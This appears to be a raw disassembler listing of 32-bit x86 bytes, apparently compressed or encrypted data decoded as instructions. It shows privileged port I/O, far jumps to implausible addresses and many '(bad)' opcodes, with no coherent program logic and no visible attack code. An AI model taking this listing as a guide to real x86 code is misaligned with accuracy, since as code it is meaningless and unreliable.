  4208aa:	bound  edx,QWORD PTR [ebx]
  4208ac:	jg     0x42087d
  4208ae:	stos   BYTE PTR es:[edi],al
  4208af:	jns    0x4208f4
  4208b1:	cmp    esi,DWORD PTR [ecx]
  4208b3:	jg     0x420877
  4208b5:	mov    eax,0x6447f8e2
  4208ba:	add    DWORD PTR [edi+0x4a],edx
  4208bd:	push   0xffffffcb
  4208bf:	mov    ds:0xa6446553,eax
  4208c4:	adc    DWORD PTR [eax-0x24],0xe822fb0f
  4208cb:	std    
  4208cc:	fisttp QWORD PTR [bp+di]
  4208cf:	jbe    0x420909
  4208d1:	pop    ecx
  4208d2:	cmc    
  4208d3:	dec    edx
  4208d4:	inc    esp
  4208d5:	pop    es
  4208d6:	and    eax,0x20505dd9
  4208db:	xchg   ebp,eax
  4208dc:	mov    cl,0x6b
  4208de:	out    dx,eax
  4208df:	aas    
  4208e0:	xor    DWORD PTR [ecx+0x3da9dd62],0x25
  4208e7:	sub    bl,ch
  4208e9:	icebp  
  4208ea:	inc    DWORD PTR [ebx]
  4208ec:	sbb    eax,0x618de8fc
  4208f1:	dec    esi
  4208f2:	xchg   ecx,eax
  4208f3:	and    al,0x78
  4208f5:	add    al,0xfd
  4208f7:	ins    BYTE PTR es:[edi],dx
  4208f8:	cwde   
  4208f9:	xchg   edx,eax
  4208fa:	and    al,0xac
  4208fc:	push   esi
  4208fd:	fwait
  4208fe:	mov    dl,0xdc
  420900:	jg     0x4208ed
  420902:	cdq    
  420903:	pop    ecx
  420904:	or     BYTE PTR [ecx+ebp*2-0x649dc8ac],cl
  42090b:	cli    
  42090c:	and    BYTE PTR [eax+ebx*8+0x6b],bh
  420910:	mov    dl,0xb5
  420912:	cmp    ebp,edi
  420914:	shr    DWORD PTR [edx+0x120feacc],cl
  42091a:	mov    eax,0x4c45e627
  42091f:	and    ch,BYTE PTR [esi-0x7c9121a6]
  420925:	jmp    0x8794774f
  42092a:	ret    
  42092b:	ret    0x3efd
  42092e:	dec    esi
  42092f:	jmp    0x86e561be
  420934:	sar    cl,1
  420936:	daa    
  420937:	sar    DWORD PTR [ebp-0x59],1
  42093a:	cmp    BYTE PTR [edx+0x13a45ebf],ch
  420940:	mov    ?,WORD PTR [esi+0x27714f01]
  420946:	cli    
  420947:	ror    DWORD PTR [ebx-0x23d96d72],1
  42094d:	je     0x4208f3
  42094f:	inc    edi
  420950:	inc    eax
  420951:	mov    ds:0xe946762a,al
  420956:	pop    ebx
  420957:	mov    esp,0x6372dad1
  42095c:	xchg   edi,eax
  42095d:	ins    BYTE PTR es:[edi],dx
  42095e:	test   al,0x7c
  420960:	sub    al,0xf1
  420962:	pop    edi
  420963:	cmc    
  420964:	and    eax,0x95ebe367
  420969:	inc    esi
  42096a:	adc    BYTE PTR [edi+ebp*8],dl
  42096d:	inc    ebx
  42096e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42096f:	add    al,0x50
  420971:	out    0x7c,eax
  420973:	fnstsw WORD PTR [ecx-0x2b]
  420976:	pop    ds
  420977:	pusha  
  420978:	inc    esp
  420979:	sub    al,BYTE PTR [ebp+0x8]
  42097c:	push   0xcf9b49ac
  420981:	add    BYTE PTR [ebp+0x680f56ae],ah
  420987:	push   cs
  420988:	sub    eax,0x37db42d5
  42098d:	es loop 0x4209bf
  420990:	sbb    BYTE PTR [edx-0x59a2529f],ch
  420996:	iret   
  420997:	xor    cl,0x56
  42099a:	inc    edi
  42099b:	pop    edi
  42099c:	mov    al,0x4a
  42099e:	inc    ecx
  42099f:	mov    dl,BYTE PTR [esi]
  4209a1:	or     DWORD PTR [ecx-0x12406566],ecx
  4209a7:	xor    eax,0x8db3e5ea
  4209ac:	sbb    bl,BYTE PTR cs:[edx-0x1]
  4209b0:	scas   eax,DWORD PTR es:[edi]
  4209b1:	jecxz  0x420a09
  4209b3:	pop    ebp
  4209b4:	xlat   BYTE PTR ds:[ebx]
  4209b5:	cmp    BYTE PTR [edi-0x3330e36b],bh
  4209bb:	push   0x8d49111
  4209c0:	(bad)  
  4209c1:	or     al,0x82
  4209c3:	or     ecx,DWORD PTR [eax+0x43325ebc]
  4209c9:	ret    0x9676
  4209cc:	out    0x2f,al
  4209ce:	mov    bh,0xe5
  4209d0:	add    eax,0xbf77079c
  4209d5:	add    BYTE PTR [esi-0x6],dh
  4209d8:	mov    ecx,0xa0c37205
  4209dd:	call   0x71cd84e6
  4209e2:	test   DWORD PTR [ecx],esp
  4209e4:	lock addr16 jmp 0x4209e7
  4209e8:	jnp    0x420a03
  4209ea:	add    BYTE PTR [esi],dh
  4209ec:	add    dl,BYTE PTR [ebp+0xc]
  4209ef:	jne    0x420a50
  4209f1:	jg     0x420a2d
  4209f3:	clc    
  4209f4:	cs aas 
  4209f6:	push   0x38a5a0c3
  4209fb:	add    BYTE PTR [ebx+0x1e70001],dl
  420a01:	add    BYTE PTR [eax],al
  420a03:	xor    BYTE PTR [esi+0xe197423],ah
  420a09:	push   es
  420a0a:	call   0xb9e8:0x9f1c14d7
  420a11:	mov    ch,0x89
  420a13:	mov    ds:0xead6dfa,eax
  420a18:	loopne 0x4209b6
  420a1a:	aad    0x5c
  420a1c:	outs   dx,BYTE PTR ds:[esi]
  420a1d:	push   0x3d20170a
  420a22:	loop   0x4209f8
  420a24:	jbe    0x4209bd
  420a26:	mov    al,0xd4
  420a28:	pop    edi
  420a29:	lock outs dx,DWORD PTR ds:[esi]
  420a2b:	mov    ecx,0xda7d5339
  420a30:	iret   
  420a31:	dec    edx
  420a32:	bound  edx,QWORD PTR [eax-0x7d]
  420a35:	clc    
  420a36:	fst    DWORD PTR [esi+0x3e]
  420a39:	ins    DWORD PTR es:[edi],dx
  420a3a:	jg     0x420a9a
  420a3c:	pushf  
  420a3d:	dec    ecx
  420a3e:	fdiv   DWORD PTR [esi+0x75]
  420a41:	shl    edi,1
  420a43:	in     eax,dx
  420a44:	xor    al,0x9a
  420a46:	or     cl,BYTE PTR [ebx-0x1a]
  420a49:	lods   al,BYTE PTR ds:[esi]
  420a4a:	fstp   TBYTE PTR [esi+0x72]
  420a4d:	dec    edi
  420a4e:	out    dx,al
  420a4f:	push   es
  420a50:	cmp    al,cl
  420a52:	lock and DWORD PTR [edx],ecx
  420a55:	outs   dx,BYTE PTR ds:[esi]
  420a56:	mov    eax,ds:0xa5d7f34b
  420a5b:	leave  
  420a5c:	scas   eax,DWORD PTR es:[edi]
  420a5d:	mov    BYTE PTR [ebx+0x378e221],al
  420a63:	mov    ebp,0x533b6617
  420a69:	xor    ebx,edi
  420a6b:	dec    ebx
  420a6c:	std    
  420a6d:	cmc    
  420a6e:	mul    DWORD PTR [ebx]
  420a70:	sub    al,0x5f
  420a72:	inc    ebx
  420a73:	inc    eax
  420a74:	sbb    cl,0xcb
  420a77:	fistp  QWORD PTR [edi]
  420a79:	mov    ds:0x74f41443,al
  420a7e:	adc    al,0xe1
  420a80:	xor    edx,ebx
  420a82:	fisttp QWORD PTR [ebx+0x2781a4b1]
  420a88:	clc    
  420a89:	jmp    0x1cf8a938
  420a8e:	pop    ds
  420a8f:	xchg   ebx,eax
  420a90:	out    0x64,eax
  420a92:	xchg   ecx,eax
  420a93:	test   BYTE PTR [edi-0x14],bh
  420a96:	in     al,0x94
  420a98:	lock inc eax
  420a9a:	pop    edi
  420a9b:	(bad)  [eax]
  420a9d:	mov    eax,ds:0x1c4f1dc8
  420aa2:	repz push cs
  420aa4:	push   ds
  420aa5:	inc    edx
  420aa6:	inc    esi
  420aa7:	(bad)  
  420aa8:	lock xchg ecx,eax
  420aaa:	repnz pop es
  420aac:	cs in  eax,0xb2
  420aaf:	mov    fs,edi
  420ab1:	cmp    ecx,DWORD PTR [ecx+0x24]
  420ab4:	aam    0xbc
  420ab6:	xor    eax,DWORD PTR [edi+0x33]
  420ab9:	daa    
  420aba:	cli    
  420abb:	jo     0x420b35
  420abd:	into   
  420abe:	daa    
  420abf:	jmp    0x54b67987
  420ac4:	or     DWORD PTR [esi-0x62ca747],0xffffffb1
  420acb:	inc    esp
  420acc:	xlat   BYTE PTR ds:[ebx]
  420acd:	jo     0x420b46
  420acf:	sbb    al,0xa4
  420ad1:	test   BYTE PTR [ebx-0x79],dl
  420ad4:	and    bh,BYTE PTR ds:0xa2022622
  420ada:	cli    
  420adb:	dec    esi
  420adc:	inc    ebx
  420add:	adc    DWORD PTR [edi],edi
  420adf:	xor    esi,DWORD PTR [esi+0xcbe08e7]
  420ae5:	sub    eax,0xdbdcd786
  420aea:	cmp    al,0x46
  420aec:	addr16 mov dh,0x8d
  420aef:	pop    ds
  420af0:	mov    ah,0x79
  420af2:	hlt    
  420af3:	in     eax,dx
  420af4:	mov    ch,0x7e
  420af6:	inc    ebx
  420af7:	adc    BYTE PTR [ebx],dh
  420af9:	xlat   BYTE PTR ds:[ebx]
  420afa:	fcmovne st,st(7)
  420afc:	push   es
  420afd:	ret    0x8a9
  420b00:	hlt    
  420b01:	xabort 0xed
  420b04:	icebp  
  420b05:	mov    ebp,0xe8a0bbc
  420b0a:	lock mov esp,0xa3baf124
  420b10:	mov    esi,DWORD PTR [edi]
  420b12:	and    al,0x21
  420b14:	or     esi,0xffffffc3
  420b17:	pop    es
  420b18:	mov    ch,0xd7
  420b1a:	cmp    eax,0xfbac6285
  420b1f:	dec    eax
  420b20:	bound  ebx,QWORD PTR [ebx]
  420b22:	hlt    
  420b23:	ret    0x8de1
  420b26:	aam    0x4b
  420b28:	pop    esi
  420b29:	sub    eax,edx
  420b2b:	hlt    
  420b2c:	xor    al,0xd3
  420b2e:	cmp    cl,BYTE PTR [edi-0x7d]
  420b31:	addr16 jnp 0x420b2c
  420b34:	pop    esp
  420b35:	inc    esp
  420b36:	repnz mov al,ds:0xf14608ea
  420b3c:	jne    0x420b2c
  420b3e:	dec    ebx
  420b3f:	xor    bh,bh
  420b41:	iret   
  420b42:	inc    ebp
  420b43:	lahf   
  420b44:	mov    edx,DWORD PTR [edi-0x45fe3768]
  420b4a:	int3   
  420b4b:	adc    BYTE PTR [ebx],dl
  420b4d:	out    0xe3,al
  420b4f:	dec    ebx
  420b50:	push   ebp
  420b51:	popa   
  420b52:	jecxz  0x420b88
  420b54:	(bad)  
  420b55:	dec    edi
  420b56:	int    0xf3
  420b58:	mov    cl,0x73
  420b5a:	dec    edi
  420b5b:	xor    ch,BYTE PTR [esi]
  420b5d:	pop    ebp
  420b5e:	push   edx
  420b5f:	das    
  420b60:	std    
  420b61:	es dec esp
  420b63:	popa   
  420b64:	(bad)  
  420b65:	mov    edi,0x823c94e
  420b6a:	jnp    0x420af5
  420b6c:	dec    ebx
  420b6d:	shr    DWORD PTR [eax],0x6f
  420b70:	std    
  420b71:	or     DWORD PTR [esi+0x69],ebx
  420b74:	pop    edi
  420b75:	push   0x49
  420b77:	mov    bh,0xc2
  420b79:	arpl   WORD PTR [ebx],cx
  420b7b:	xor    al,0x8
  420b7d:	fistp  QWORD PTR [ebx+0x14]
  420b80:	outs   dx,BYTE PTR ds:[esi]
  420b81:	mov    dh,0x48
  420b83:	jge    0x420bbb
  420b85:	ss adc esi,ebp
  420b88:	jmp    DWORD PTR [eax+eiz*2-0x7e9129bf]
  420b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b90:	inc    ebp
  420b91:	out    0xa2,al
  420b93:	sbb    BYTE PTR [esi+0x6bed4922],0x63
  420b9a:	les    esi,FWORD PTR [esi+0x77]
  420b9d:	cld    
  420b9e:	ja     0x420b56
  420ba0:	mov    ch,0xc
  420ba2:	cmp    al,BYTE PTR [edi]
  420ba4:	add    al,0xa
  420ba6:	and    bh,ch
  420ba8:	jns    0x420bd0
  420baa:	lock call DWORD PTR [ebx+0x5af29bfa]
  420bb1:	gs ins BYTE PTR es:[edi],dx
  420bb3:	jmp    DWORD PTR [edi+0x12]
  420bb6:	into   
  420bb7:	xor    eax,0xf562e471
  420bbc:	mov    eax,ds:0x88ed7e8e
  420bc1:	and    ch,BYTE PTR [edi+ebp*4+0x7001583a]
  420bc8:	je     0x420b4d
  420bca:	pop    es
  420bcb:	retf   
  420bcc:	stos   BYTE PTR es:[edi],al
  420bcd:	in     eax,0x4
  420bcf:	jle    0x420b72
  420bd1:	inc    esp
  420bd2:	or     BYTE PTR [esi],cl
  420bd4:	lea    eax,[ebp+0x26dfa42]
  420bda:	int3   
  420bdb:	call   FWORD PTR [ebp+0x2b352089]
  420be1:	cdq    
  420be2:	mov    al,0x46
  420be4:	in     eax,dx
  420be5:	je     0x420c16
  420be7:	adc    ah,cl
  420be9:	jmp    0xfb3b:0x72b10800
  420bf0:	sti    
  420bf1:	dec    ecx
  420bf2:	mov    bl,0x94
  420bf4:	je     0x420bcd
  420bf6:	call   0x94e7:0x14b16b7b
  420bfd:	add    DWORD PTR [eax],eax
  420bff:	out    0x1,eax
  420c01:	add    BYTE PTR [eax],al
  420c03:	loope  0x420c43
  420c05:	mov    dh,0x4a
  420c07:	or     BYTE PTR [edx+0x2b],ch
  420c0a:	mov    ah,0x63
  420c0c:	popf   
  420c0d:	(bad)
  420c12:	jl     0x420c91
  420c14:	icebp  
  420c15:	je     0x420be5
  420c17:	ret    
  420c18:	sti    
  420c19:	ds pop ebx
  420c1b:	test   al,0x85
  420c1d:	xlat   BYTE PTR ds:[ebx]
  420c1e:	es xchg ebx,eax
  420c20:	dec    ebx
  420c21:	pop    ecx
  420c22:	dec    edx
  420c23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c24:	test   ecx,esi
  420c26:	stos   DWORD PTR es:[edi],eax
  420c27:	or     esp,ebp
  420c29:	jae    0x420c7c
  420c2b:	out    0x98,al
  420c2d:	fadd   st(0),st
  420c2f:	nop
  420c30:	out    dx,al
  420c31:	imul   esi,DWORD PTR [ebx],0xffffffa5
  420c34:	sbb    eax,0x473d7814
  420c39:	mov    ds:0xa201dcf0,eax
  420c3e:	cmp    DWORD PTR [ebx],esi
  420c40:	jne    0x420c56
  420c42:	call   0x1d11cb8f
  420c47:	pop    ebx
  420c48:	inc    ebx
  420c49:	out    dx,eax
  420c4a:	and    edx,DWORD PTR [eax+0x6]
  420c4d:	ret    
  420c4e:	outs   dx,DWORD PTR ds:[esi]
  420c4f:	mov    esp,0xd5d5f4e
  420c54:	xor    eax,esp
  420c56:	add    eax,ecx
  420c58:	inc    ecx
  420c59:	dec    esi
  420c5a:	sbb    BYTE PTR [edx],dl
  420c5c:	cli    
  420c5d:	jno    0x420c6b
  420c5f:	repnz xchg bl,bl
  420c62:	(bad)  
  420c63:	push   ds
  420c64:	xor    eax,DWORD PTR [edi]
  420c66:	das    
  420c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c68:	mov    edi,0x55a74e02
  420c6d:	loope  0x420c78
  420c6f:	outs   dx,DWORD PTR ds:[esi]
  420c70:	adc    edi,0xaf912cf0
  420c76:	xchg   ebx,eax
  420c77:	inc    edx
  420c78:	leave  
  420c79:	dec    edx
  420c7a:	leave  
  420c7b:	dec    esp
  420c7c:	and    DWORD PTR [ebx-0x15],0xffffffb8
  420c80:	lahf   
  420c81:	iret   
  420c82:	jnp    0x420c61
  420c84:	in     eax,0x14
  420c86:	jo     0x420c67
  420c88:	nop
  420c89:	mov    edi,ebp
  420c8b:	sbb    ebx,esp
  420c8d:	jp     0x420c8c
  420c8f:	mov    cl,0x64
  420c91:	inc    ebp
  420c92:	cmp    eax,0xab6c8ac
  420c97:	xor    esp,DWORD PTR [eax]
  420c99:	lods   eax,DWORD PTR ds:[esi]
  420c9a:	stos   BYTE PTR es:[edi],al
  420c9b:	mov    eax,ds:0x28184a9
  420ca0:	xor    DWORD PTR [ecx+0x4e8d94e0],esp
  420ca6:	or     eax,DWORD PTR [edi+0x2d943bc4]
  420cac:	std    
  420cad:	push   ebx
  420cae:	mov    cl,BYTE PTR [edi+edi*1-0x52f75a16]
  420cb5:	xor    edi,DWORD PTR [esi]
  420cb7:	idiv   BYTE PTR [edx]
  420cb9:	retf   0xf11d
  420cbc:	fwait
  420cbd:	test   BYTE PTR [ecx+esi*4+0x7a],dh
  420cc1:	retf   0x35b2
  420cc4:	ret    0xeb62
  420cc7:	out    0x85,eax
  420cc9:	mov    dl,0x81
  420ccb:	pop    ds
  420ccc:	nop
  420ccd:	jbe    0x420ce5
  420ccf:	fldenv ds:0x6d5691f1
  420cd5:	mul    ah
  420cd7:	cvttps2pi mm4,xmm5
  420cda:	das    
  420cdb:	mov    ebp,0x95e7c6f4
  420ce0:	cmp    DWORD PTR [ecx-0x7],ebp
  420ce3:	push   edx
  420ce4:	inc    esp
  420ce5:	xor    al,0xd4
  420ce7:	adc    cl,BYTE PTR [ecx-0x16ac16b8]
  420ced:	dec    ecx
  420cee:	xchg   edi,eax
  420cef:	dec    esp
  420cf0:	cmc    
  420cf1:	pop    ds
  420cf2:	sbb    eax,0xad38c619
  420cf7:	dec    ecx
  420cf8:	ror    edx,1
  420cfa:	(bad)  
  420cfb:	jns    0x420ced
  420cfd:	xchg   DWORD PTR [eax],ebx
  420cff:	mov    bl,dh
  420d01:	xchg   ebx,eax
  420d02:	aam    0xdc
  420d04:	pop    esi
  420d05:	repz fldenv [ebp-0x76c4d6e3]
  420d0c:	sahf   
  420d0d:	frstor [edi-0x1f86564d]
  420d13:	shr    DWORD PTR [ebx-0x7a5d210e],0x37
  420d1a:	not    BYTE PTR [ebx-0x26]
  420d1d:	add    eax,0x856a155b
  420d22:	(bad)  
  420d23:	sti    
  420d24:	adc    esp,DWORD PTR [ebp+0x50bdcd74]
  420d2a:	or     esp,ebx
  420d2c:	je     0x420ce7
  420d2e:	call   0x51788c56
  420d33:	xchg   dh,dl
  420d35:	cmp    al,0x3b
  420d37:	adc    esp,eax
  420d39:	lock psrlq mm1,QWORD PTR [ebp+0x5a8dc369]
  420d41:	pop    ebx
  420d42:	jle    0x420d62
  420d44:	mov    esi,0xc3fef90b
  420d49:	add    esp,DWORD PTR [edx]
  420d4b:	in     eax,dx
  420d4c:	inc    edx
  420d4d:	add    DWORD PTR [ecx],esi
  420d4f:	out    0x8f,eax
  420d51:	retf   
  420d52:	(bad)  
  420d53:	repz mov ds:0x7b74c752,eax
  420d59:	adc    eax,0x9e15e001
  420d5e:	inc    ecx
  420d5f:	rol    DWORD PTR [eax],0x74
  420d62:	das    
  420d63:	fstp   QWORD PTR [ecx+0x1b]
  420d66:	lea    esi,[edx+0x2c]
  420d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d6a:	push   ebp
  420d6b:	rcl    BYTE PTR [esi-0x7d],cl
  420d6e:	popf   
  420d6f:	pusha  
  420d70:	jbe    0x420d5b
  420d72:	and    al,0x2c
  420d74:	fistp  QWORD PTR [esi+0x72]
  420d77:	out    dx,al
  420d78:	mov    ebx,0x61949c08
  420d7d:	leave  
  420d7e:	ds out dx,eax
  420d80:	sbb    ch,BYTE PTR [edx]
  420d82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d83:	test   eax,0x519525ce
  420d88:	mov    ah,0xc5
  420d8a:	fmul   DWORD PTR [edi-0xa76aaef]
  420d90:	mov    esp,0xbe5ef816
  420d95:	pop    ds
  420d96:	aas    
  420d97:	jecxz  0x420d93
  420d99:	cmp    BYTE PTR [edx-0x4a],bh
  420d9c:	mov    dl,0xe9
  420d9e:	out    0xa,al
  420da0:	xor    ebp,DWORD PTR [eax]
  420da2:	cvtps2pd xmm2,QWORD PTR [esi]
  420da5:	out    dx,al
  420da6:	sbb    eax,0xca241073
  420dab:	mov    dh,0xfc
  420dad:	mov    fs,WORD PTR [edx+0x51]
  420db0:	jge    0x420dda
  420db2:	mov    ah,bl
  420db4:	inc    edi
  420db5:	and    BYTE PTR [edx+edx*1+0x1],bh
  420db9:	or     eax,0xbec9fb6a
  420dbe:	fimul  DWORD PTR [eax]
  420dc0:	nop
  420dc1:	push   ecx
  420dc2:	push   0xcbec9a20
  420dc7:	stos   BYTE PTR es:[edi],al
  420dc8:	mov    edx,0xf4bd5d8e
  420dcd:	daa    
  420dce:	test   al,0xc1
  420dd0:	cdq    
  420dd1:	scas   al,BYTE PTR es:[edi]
  420dd2:	mov    al,0xfa
  420dd4:	(bad)  
  420dd5:	push   esp
  420dd6:	int3   
  420dd7:	inc    edx
  420dd8:	jmp    0x587:0xde1b047
  420ddf:	cmp    al,0x21
  420de1:	cmp    BYTE PTR [bp+di-0x50fb],cl
  420de6:	jg     0x420de0
  420de8:	cmp    DWORD PTR [edi+0x0],esi
  420deb:	fist   WORD PTR [ebx-0x4e]
  420dee:	dec    edi
  420def:	mov    esi,0x67d3ffef
  420df4:	xchg   ecx,edi
  420df6:	adc    al,0xb2
  420df8:	ret    0xfc94
  420dfb:	into   
  420dfc:	xchg   esi,eax
  420dfd:	add    DWORD PTR [eax],eax
  420dff:	out    0x1,eax
  420e01:	add    BYTE PTR [eax],al
  420e03:	push   esp
  420e04:	aas    
  420e05:	xchg   ecx,eax
  420e06:	ins    DWORD PTR es:[edi],dx
  420e07:	push   0x7305bde0
  420e0c:	scas   al,BYTE PTR es:[edi]
  420e0d:	mov    ecx,0xe97b8e73
  420e12:	adc    DWORD PTR [ecx-0x6e],esp
  420e15:	lahf   
  420e16:	fwait
  420e17:	cmp    ch,BYTE PTR [ebp-0x3a6a1279]
  420e1d:	je     0x420e9c
  420e1f:	and    ebp,DWORD PTR [edi]
  420e21:	pop    es
  420e22:	cmp    al,0xc1
  420e24:	mov    esi,0x73532618
  420e29:	les    eax,FWORD PTR [ecx-0x74]
  420e2c:	xchg   edx,eax
  420e2d:	sahf   
  420e2e:	ds leave 
  420e30:	out    0x8d,eax
  420e32:	ficom  WORD PTR [edi+0x2b]
  420e35:	cs fcmovnb st,st(3)
  420e38:	or     eax,0x6f1aa38b
  420e3d:	clc    
  420e3e:	sti    
  420e3f:	pop    edi
  420e40:	dec    esi
  420e41:	cmp    DWORD PTR [edx],0x72d0ce08
  420e47:	pop    edi
  420e48:	mov    ch,0x38
  420e4a:	xor    eax,0xc9826b94
  420e4f:	in     eax,dx
  420e50:	mov    ecx,0xd4fd85f4
  420e55:	loop   0x420ec1
  420e57:	jmp    0x420eaa
  420e59:	adc    ah,BYTE PTR [ecx-0xf89433e]
  420e5f:	sub    ebx,DWORD PTR [ecx-0x7ef14037]
  420e65:	pop    eax
  420e66:	cmp    cl,bl
  420e68:	push   edi
  420e69:	or     al,0xf0
  420e6b:	pusha  
  420e6c:	dec    eax
  420e6d:	cli    
  420e6e:	xchg   ecx,eax
  420e6f:	jg     0x420e7e
  420e71:	mov    BYTE PTR [ecx-0x78],dh
  420e74:	stc    
  420e75:	xchg   esi,eax
  420e76:	imul   eax,edx,0x4f
  420e79:	or     al,0x29
  420e7b:	shr    BYTE PTR [ecx+0x21],1
  420e7e:	jo     0x420e62
  420e80:	leave  
  420e81:	js     0x420e65
  420e83:	in     eax,dx
  420e84:	push   edx
  420e85:	cmp    eax,0x620a3cf5
  420e8a:	cld    
  420e8b:	icebp  
  420e8c:	jle    0x420e34
  420e8e:	mov    ch,BYTE PTR [eax-0xc]
  420e91:	dec    edx
  420e92:	and    esp,DWORD PTR [eax+ebx*8]
  420e95:	test   edx,edx
  420e97:	aam    0x22
  420e99:	fsub   DWORD PTR [edi-0x70e89ce4]
  420e9f:	ds ins DWORD PTR es:[edi],dx
  420ea1:	mov    ds:0xd9c72259,eax
  420ea6:	dec    eax
  420ea7:	fisttp QWORD PTR [ecx-0x6838af21]
  420ead:	cmp    eax,0xc41050de
  420eb2:	pushf  
  420eb3:	xchg   edx,eax
  420eb4:	dec    edx
  420eb5:	and    ebp,eax
  420eb7:	(bad)  
  420eb8:	jo     0x420edf
  420eba:	ins    DWORD PTR es:[edi],dx
  420ebb:	xchg   ebp,eax
  420ebc:	outs   dx,DWORD PTR ds:[esi]
  420ebd:	ret    0x541
  420ec0:	or     DWORD PTR [edx+0x4577eb39],ebx
  420ec6:	and    al,0x50
  420ec8:	inc    ebp
  420ec9:	stos   BYTE PTR es:[edi],al
  420eca:	inc    ebp
  420ecb:	inc    esp
  420ecc:	call   0xc7da:0x433da174
  420ed3:	psrad  mm0,QWORD PTR [edi]
  420ed6:	fstp   DWORD PTR [ebx-0x10f0c60f]
  420edc:	mov    esp,0xaab2ec36
  420ee1:	(bad)  
  420ee2:	outs   dx,BYTE PTR ds:[esi]
  420ee3:	dec    esp
  420ee4:	(bad)  
  420ee6:	fld    TBYTE PTR [eax-0x7]
  420ee9:	pop    ebp
  420eea:	jns    0x420ebf
  420eec:	jae    0x420f08
  420eee:	add    edx,ecx
  420ef0:	sti    
  420ef1:	fiadd  WORD PTR [ecx-0x50457b7e]
  420ef7:	dec    ebp
  420ef8:	cmp    al,0x1a
  420efa:	mov    ebp,0x130de9cc
  420eff:	bound  edx,QWORD PTR [ebx+eax*1-0x56]
  420f03:	jo     0x420f04
  420f05:	(bad)  
  420f07:	inc    edi
  420f08:	add    ecx,DWORD PTR [edi+ebx*2-0x47]
  420f0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f0d:	pop    edx
  420f0e:	sub    al,0x40
  420f10:	in     eax,dx
  420f11:	xor    DWORD PTR [esp+eiz*2],ebx
  420f14:	ss pop ebx
  420f16:	adc    DWORD PTR [esi-0x4a],ecx
  420f19:	fldenv [ebp+0x3e]
  420f1c:	fistp  DWORD PTR [ebx]
  420f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f1f:	outs   dx,DWORD PTR ds:[esi]
  420f20:	out    0x98,eax
  420f22:	xor    BYTE PTR [eax],ah
  420f24:	cdq    
  420f25:	lds    esp,FWORD PTR [ebx]
  420f27:	repnz std 
  420f29:	and    ecx,esi
  420f2b:	xchg   ebx,eax
  420f2c:	adc    dh,al
  420f2e:	push   esi
  420f2f:	lods   al,BYTE PTR ds:[esi]
  420f30:	lea    eax,[ebx]
  420f32:	popf   
  420f33:	scas   eax,DWORD PTR es:[edi]
  420f34:	xchg   ebp,eax
  420f35:	mov    DWORD PTR [ecx+0x1adf8f08],edi
  420f3b:	in     al,0x2c
  420f3d:	icebp  
  420f3e:	out    dx,eax
  420f3f:	push   edx
  420f40:	push   0x51407279
  420f45:	addr16 lahf 
  420f47:	hlt    
  420f48:	aaa    
  420f49:	xchg   ebp,eax
  420f4a:	imul   bl
  420f4c:	fsub   QWORD PTR [edi+ebx*2+0x77]
  420f50:	in     al,0x70
  420f52:	dec    esi
  420f53:	xchg   DWORD PTR [ecx],ebx
  420f55:	test   eax,0xb4d320e9
  420f5a:	push   esp
  420f5b:	test   BYTE PTR [eax+0x54],cl
  420f5e:	hlt    
  420f5f:	or     al,0xf2
  420f61:	ds jecxz 0x420f45
  420f64:	pushf  
  420f65:	jo     0x420f29
  420f67:	lea    ebx,[edx-0x34]
  420f6a:	pop    es
  420f6b:	out    0x52,al
  420f6d:	data16 imul BYTE PTR [ebx+0x4547865]
  420f74:	xchg   ebp,eax
  420f75:	sahf   
  420f76:	test   DWORD PTR [esi-0x32],esp
  420f79:	fadd   QWORD PTR [ebp+0x38]
  420f7c:	push   es
  420f7d:	rcr    DWORD PTR [edi+0x67],0xe8
  420f81:	icebp  
  420f82:	js     0x420fb1
  420f84:	pop    ebp
  420f85:	push   eax
  420f86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f87:	push   edi
  420f88:	and    eax,0xe89595ec
  420f8d:	int3   
  420f8e:	(bad)  
  420f8f:	mov    DWORD PTR [ebx+0x49],ebp
  420f92:	sub    al,0x61
  420f94:	loopne 0x420f1f
  420f96:	ror    BYTE PTR [eax],cl
  420f98:	jns    0x421000
  420f9a:	stos   DWORD PTR es:[edi],eax
  420f9b:	pop    ds
  420f9c:	pushf  
  420f9d:	push   esi
  420f9e:	leave  
  420f9f:	push   eax
  420fa0:	adc    DWORD PTR [esi+0x2e],ecx
  420fa3:	sub    DWORD PTR [ebp-0x43fe58d0],edx
  420fa9:	xor    DWORD PTR [ebp-0xe],ebx
  420fac:	cld    
  420fad:	push   es
  420fae:	aad    0x93
  420fb0:	push   ebx
  420fb1:	sahf   
  420fb2:	cld    
  420fb3:	iret   
  420fb4:	das    
  420fb5:	retf   0xdd6f
  420fb8:	fcmovbe st,st(5)
  420fba:	xor    eax,0x672ae31a
  420fbf:	and    esp,ebp
  420fc1:	pop    ds
  420fc2:	jge    0x420fef
  420fc4:	in     al,dx
  420fc5:	sub    eax,0xceaac97a
  420fca:	pop    esi
  420fcb:	in     al,0x94
  420fcd:	cmp    dh,BYTE PTR [edi-0x33abffd2]
  420fd3:	daa    
  420fd4:	pop    ebp
  420fd5:	jae    0x421014
  420fd7:	in     al,dx
  420fd8:	dec    eax
  420fd9:	in     eax,0x40
  420fdb:	scas   al,BYTE PTR es:[edi]
  420fdc:	cs cwde 
  420fde:	dec    edx
  420fdf:	outs   dx,BYTE PTR ds:[esi]
  420fe0:	loope  0x421010
  420fe2:	mov    fs,WORD PTR [ebx-0x200465e1]
  420fe8:	ror    BYTE PTR [edx+0x0],cl
  420feb:	xchg   DWORD PTR [ebx+edx*8],ecx
  420fee:	fcmovu st,st(3)
  420ff0:	fisttp WORD PTR [edi+0x640ccb5d]
  420ff6:	push   ss
  420ff7:	sub    dh,bl
  420ff9:	imul   esp,DWORD PTR [edx],0xffffffb5
  420ffc:	cwde   
  420ffd:	add    DWORD PTR [eax],eax
  420fff:	out    0x1,eax
  421001:	add    BYTE PTR [eax],al
  421003:	inc    esp
  421004:	cmp    dh,BYTE PTR [ebp-0x2d]
  421007:	pushf  
  421008:	hlt    
  421009:	push   ds
  42100a:	mov    eax,ds:0x9ed079ed
  42100f:	mov    ch,0x8c
  421011:	sbb    al,0xf8
